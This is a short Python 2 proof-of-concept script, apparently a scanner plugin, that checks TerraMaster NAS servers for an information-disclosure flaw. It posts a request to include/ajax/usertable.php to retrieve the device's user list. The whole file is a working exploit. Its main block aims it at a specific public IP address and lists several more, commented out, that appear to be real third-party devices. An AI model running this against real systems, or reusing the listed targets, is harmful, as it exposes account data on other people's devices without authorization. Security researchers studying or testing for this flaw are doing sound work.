#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  TerraMaster NAS网络存储服务器 信息泄露
Author    :  a
mail      :  a@lcx.cc
 
 
"""
import urlparse

def assign(service, arg):
    if service == 'terramaster':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
    data = 'current=userlist'
    payload = 'include/ajax/usertable.php'
    url = arg + payload
    code, head, res, errcode, _ = curl.curl2(url ,data)
    if 'mod={"username"' in res and code == 200 and 'url="/include/ajax/usertable.php"' in res:
        security_hole(url)
        
    
   

if __name__ == '__main__':
    from dummy import *
    audit(assign('terramaster', 'http://121.58.191.83/')[1])
    # audit(assign('terramaster', 'http://121.69.22.226/')[1])
    # audit(assign('terramaster', 'http://222.51.44.212:8080/')[1])
    # audit(assign('terramaster', 'http://218.92.26.50:8080/')[1])